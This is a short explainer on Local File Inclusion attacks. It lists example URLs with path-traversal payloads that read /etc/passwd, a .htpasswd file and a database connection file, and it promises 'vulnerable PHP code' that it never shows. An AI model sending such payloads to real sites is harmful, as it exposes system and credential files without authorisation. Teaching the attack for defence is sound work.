### How does an LFI Attack Work

A Local File Inclusion can occur when an application includes a file as user input without properly validating it. This flaw enables an attacker to include malicious files by manipulating the input.

The following vulnerable PHP code could lead to LFI:

`https://website-example.com/?page=filename.php`

`https://website-example.com/?page=../../../../etc/test.txt`

`http://www.example_target_website.com/download.php?file=document.html`

`http://www.example_target_website.com/download.php?file=../../../../etc/passwd`

`https://example-vulnerable-website.com/?module=contact.php`

`https://example-vulnerable-website.com/?module=/etc/passwd`

`https://example-vulnerable-website.com/?module=uploads/image123.gif`

`https://example-vulnerable-website.com/?helpfile=login.txt`

```https://example-vulnerable-website.com/?helpfile=../secret/.htpasswd

https://example-vulnerable-website.com/?download=brochure.pdf

https://example-vulnerable-website.com/?download=../include/connection.php```
